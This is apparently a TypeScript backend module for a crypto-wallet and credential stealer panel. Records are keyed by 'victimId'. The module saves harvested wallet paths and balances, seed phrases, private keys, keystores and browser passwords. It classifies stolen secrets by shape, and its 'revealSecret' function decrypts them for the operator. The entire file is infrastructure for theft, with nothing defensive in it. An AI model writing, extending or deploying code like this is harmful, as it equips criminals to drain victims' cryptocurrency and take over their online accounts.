import { createHash } from 'node:crypto';
import type { Prisma, WalletState } from '@prisma/client';
import { prisma } from '../lib/db';
import { openSecret, sealSecret, sha256hex } from '../lib/crypto';
import type { Db } from '../lib/audit';

/**
 * Canonical path identity: lower case, forward slashes, no duplicate or
 * trailing separators. Two scans of the same file must land on one row.
 */
export function normalizePath(input: string): string {
  return String(input)
    .replace(/\0/g, '')
    .replace(/\\/g, '/')
    .split('/')
    .map((part) => part.trim())
    .filter(Boolean)
    .join('/')
    .toLowerCase();
}

const STATE_RANK: Record<WalletState, number> = {
  decrypted: 6,
  found: 5,
  locked: 4,
  no_vault: 3,
  unsupported: 2,
  corrupt: 1,
  failed: 0
};

const STATE = new Set(Object.keys(STATE_RANK));

export function normalizeState(value: unknown, fallback: WalletState = 'found'): WalletState {
  const state = String(value ?? '').toLowerCase();
  return STATE.has(state) ? state as WalletState : fallback;
}

export type WalletInput = {
  targetId: string;
  kind?: string;
  path: string;
  state?: string;
  reason?: string | null;
  address?: string | null;
  balance?: string | null;
  decryptState?: string;
  decryptError?: string | null;
  artifactId?: string | null;
  source?: string | null;
  label?: string | null;
};

export type SecretInput = {
  walletId?: string | null;
  path?: string | null;
  kind: string;
  value: string;
  words?: number | null;
  confidence?: number | null;
  artifactId?: string | null;
  source?: string | null;
};

export type CredentialInput = {
  path: string;
  url?: string | null;
  username?: string | null;
  password?: string | null;
  kind?: string;
  state?: string;
  reason?: string | null;
};

/** Map agent/legacy secret labels onto the stable vault vocabulary. */
export function normalizeSecretKind(kind: string): string {
  const value = kind.toLowerCase();
  if (value.startsWith('bip39') || value === 'seed') return 'seed';
  if (value === 'mnemonic') return 'mnemonic';
  if (['xprv', 'yprv', 'zprv', 'solana', 'evm-key', 'hex64', 'hex', 'wif', 'private_key', 'privatekey'].includes(value)) return 'private_key';
  if (value === 'keystore_json' || value === 'keystore') return 'keystore';
  if (value === 'passphrase') return 'passphrase';
  if (value === 'password') return 'password';
  return value || 'other';
}

const MNEMONIC_COUNTS = new Set([12, 15, 18, 21, 24]);

/**
 * Canonical kind from label **and** material. A 64-hex string is a private
 * key even when the scanner found it inside `accounts.json`; a nine-word
 * phrase is a seed even when the caller said `hex`. Spanish BIP-39 lists are
 * not in the agent dictionary, so matching by shape is safer than by label.
 */
export function secretKindFor(kind: string, value: string, words?: number | null): string {
  const normalized = normalizeSecretKind(kind);
  if (words != null && MNEMONIC_COUNTS.has(Number(words))) return 'seed';
  if (normalized === 'seed' || normalized === 'mnemonic') return 'seed';
  const tokens = value.trim().split(/\s+/).filter(Boolean);
  if (tokens.length >= 12 && tokens.every((token) => /^[a-záéíóúüñ]+$/i.test(token))) return 'seed';
  return normalized;
}

/** `"1.204 ETH"`, `"0,5 ETH"`, `"<0.0001 BTC"` -> number. */
export function balanceNumber(value: string | null | undefined): number {
  if (!value) return 0;
  const match = String(value).replace(/\s+/g, ' ').match(/([\d.,]+)/);
  if (!match) return 0;
  let raw = match[1]!;
  if (raw.includes('.') && raw.includes(',')) raw = raw.replace(/,/g, '');
  else if (raw.includes(',')) raw = raw.replace(',', '.');
  const parsed = Number(raw);
  return Number.isFinite(parsed) ? parsed : 0;
}

export function hasBalance(value: string | null | undefined): boolean {
  return balanceNumber(value) > 0;
}

const isNonEmpty = (value: unknown): value is string => typeof value === 'string' && value.trim().length > 0;

export async function upsertWallets(victimId: string, input: WalletInput[], db: Db = prisma) {
  const out: Array<{ id: string; path: string }> = [];
  for (const item of input.slice(0, 5000)) {
    if (!isNonEmpty(item.path) || !isNonEmpty(item.targetId)) continue;
    const path = normalizePath(item.path);
    if (!path) continue;
    const existing = await db.wallet.findUnique({
      where: { victimId_path: { victimId, path } },
      select: { id: true, state: true }
    });
    const nextState = normalizeState(item.state, existing ? existing.state : 'found');
    const state = existing && STATE_RANK[existing.state as WalletState] > STATE_RANK[nextState] ? existing.state : nextState;
    const data = {
      kind: item.kind || 'extension',
      targetId: item.targetId,
      state,
      lastSeenAt: new Date(),
      ...(item.reason !== undefined ? { reason: item.reason } : {}),
      ...(item.address !== undefined ? { address: item.address } : {}),
      ...(item.balance !== undefined ? { balance: item.balance } : {}),
      ...(item.decryptState !== undefined ? { decryptState: item.decryptState } : {}),
      ...(item.decryptError !== undefined ? { decryptError: item.decryptError } : {}),
      ...(item.artifactId !== undefined ? { artifactId: item.artifactId } : {}),
      ...(item.source !== undefined ? { source: item.source } : {}),
      ...(item.label !== undefined ? { label: item.label } : {})
    } satisfies Prisma.WalletUpdateInput;
    const wallet = await db.wallet.upsert({
      where: { victimId_path: { victimId, path } },
      update: data,
      create: {
        victimId,
        path,
        kind: item.kind || 'extension',
        targetId: item.targetId,
        state: nextState,
        reason: item.reason ?? null,
        address: item.address ?? null,
        balance: item.balance ?? null,
        decryptState: item.decryptState ?? 'none',
        decryptError: item.decryptError ?? null,
        artifactId: item.artifactId ?? null,
        source: item.source ?? null,
        label: item.label ?? null
      },
      select: { id: true, path: true }
    });
    out.push(wallet);
  }
  return out;
}

/** Stable synthetic wallet for a secret with no wallet row of its own. */
export async function syntheticWallet(victimId: string, label: string, artifactId?: string | null, db: Db = prisma) {
  const clean = normalizePath(label) || 'unknown';
  const path = `secret:${clean}`;
  return db.wallet.upsert({
    where: { victimId_path: { victimId, path } },
    update: { lastSeenAt: new Date(), ...(artifactId ? { artifactId } : {}) },
    create: {
      victimId,
      path,
      kind: 'secret_file',
      targetId: clean.split('/').pop() || clean,
      label: clean.split('/').pop() || clean,
      state: 'decrypted',
      source: 'secret_index',
      artifactId: artifactId ?? null
    },
    select: { id: true }
  });
}

export async function upsertSecrets(victimId: string, secrets: SecretInput[], db: Db = prisma) {
  const out: string[] = [];
  for (const item of secrets.slice(0, 5000)) {
    if (!isNonEmpty(item.value) || !isNonEmpty(item.kind)) continue;
    let walletId = item.walletId ?? null;
    if (!walletId) {
      if (isNonEmpty(item.path)) {
        const path = normalizePath(item.path);
        const found = await db.wallet.findUnique({ where: { victimId_path: { victimId, path } }, select: { id: true } });
        walletId = found?.id ?? (await syntheticWallet(victimId, path, item.artifactId, db)).id;
      } else {
        walletId = (await syntheticWallet(victimId, `memory/${normalizeSecretKind(item.kind)}`, item.artifactId, db)).id;
      }
    }
    const kind = secretKindFor(item.kind, item.value, item.words);
    const valueHash = createHash('sha256').update(item.value).digest('hex');
    const secret = await db.walletSecret.upsert({
      where: { walletId_kind_valueHash: { walletId, kind, valueHash } },
      update: {
        valueEnc: sealSecret(item.value),
        ...(item.words != null ? { words: item.words } : {}),
        ...(item.confidence != null ? { confidence: item.confidence } : {}),
        ...(item.artifactId ? { artifactId: item.artifactId } : {}),
        ...(item.source ? { source: item.source } : {})
      },
      create: {
        walletId,
        kind,
        valueEnc: sealSecret(item.value),
        valueHash,
        words: item.words ?? null,
        confidence: item.confidence ?? null,
        source: item.source ?? null,
        artifactId: item.artifactId ?? null
      },
      select: { id: true }
    });
    out.push(secret.id);
  }
  return out;
}

export async function upsertCredentials(
  victimId: string,
  targetId: string,
  artifactId: string | null,
  credentials: CredentialInput[],
  db: Db = prisma
) {
  let stored = 0;
  for (const item of credentials.slice(0, 20000)) {
    if (!isNonEmpty(item.path)) continue;
    const path = normalizePath(item.path);
    const username = item.username ?? '';
    await db.credential.upsert({
      where: { victimId_targetId_path_username: { victimId, targetId, path, username } },
      update: {
        url: item.url ?? null,
        ...(item.password ? { passwordEnc: sealSecret(item.password), state: item.state ?? 'found' } : { state: item.state ?? 'empty' }),
        reason: item.reason ?? null,
        kind: item.kind ?? 'browser',
        artifactId,
        updatedAt: new Date()
      },
      create: {
        victimId,
        targetId,
        path,
        url: item.url ?? null,
        username,
        passwordEnc: item.password ? sealSecret(item.password) : null,
        state: item.password ? item.state ?? 'found' : item.state ?? 'empty',
        reason: item.reason ?? null,
        kind: item.kind ?? 'browser',
        artifactId
      }
    });
    stored += 1;
  }
  return stored;
}

export async function revealSecret(walletId: string, kind?: string, secretId?: string) {
  const secrets = await prisma.walletSecret.findMany({
    where: { walletId, ...(secretId ? { id: secretId } : {}) },
    orderBy: [{ confidence: 'desc' }, { updatedAt: 'desc' }],
    take: 50
  });
  for (const secret of secrets) {
    let value: string;
    try {
      value = openSecret(secret.valueEnc);
    } catch {
      continue;
    }
    if (kind && secretKindFor(secret.kind, value, secret.words) !== kind) continue;
    return { ...secret, value };
  }
  return null;
}

export function secretHash(value: string): string {
  return sha256hex(value);
}
